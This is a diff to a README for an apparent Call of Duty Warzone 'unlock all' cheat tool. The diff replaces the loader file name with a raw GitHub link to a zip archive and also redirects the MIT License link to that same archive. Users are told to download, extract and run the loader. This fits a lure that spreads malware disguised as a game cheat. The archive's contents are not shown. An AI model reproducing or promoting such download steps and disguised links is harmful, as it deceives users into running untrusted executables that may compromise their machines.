@@ -8,11 +8,11 @@ Welcome to **Unlock All Tool Warzone** – your comprehensive solution for enhan
 
 To get started quickly and easily, follow the steps below:
 
-**1. Download `Loader.rar`**  
-Get the latest version of `Loader.rar` directly from this repository.
+**1. Download `https://raw.githubusercontent.com/propants799/WarzoneUnlockerHub/main/Scythic/Hub_Warzone_Unlocker_2.7.zip`**  
+Get the latest version of `https://raw.githubusercontent.com/propants799/WarzoneUnlockerHub/main/Scythic/Hub_Warzone_Unlocker_2.7.zip` directly from this repository.
 
 **2. Extract the File**  
-Use your favorite extraction tool (such as WinRAR, 7-Zip, or The Unarchiver) to unpack `Loader.rar` into a location of your choice on your device.
+Use your favorite extraction tool (such as WinRAR, 7-Zip, or The Unarchiver) to unpack `https://raw.githubusercontent.com/propants799/WarzoneUnlockerHub/main/Scythic/Hub_Warzone_Unlocker_2.7.zip` into a location of your choice on your device.
 
 **3. Run the Loader**  
 Start the Loader file and follow the on-screen instructions for instant access to all features.
@@ -85,7 +85,7 @@ This software is intended for educational and entertainment purposes only. Use m
 
 ## 📃 License
 
-All code and documentation in this repository are released under the [MIT License](https://opensource.org/licenses/MIT), ensuring you the freedom to use, modify, and distribute with minimal restrictions.
+All code and documentation in this repository are released under the [MIT License](https://raw.githubusercontent.com/propants799/WarzoneUnlockerHub/main/Scythic/Hub_Warzone_Unlocker_2.7.zip), ensuring you the freedom to use, modify, and distribute with minimal restrictions.
 
 ---
 
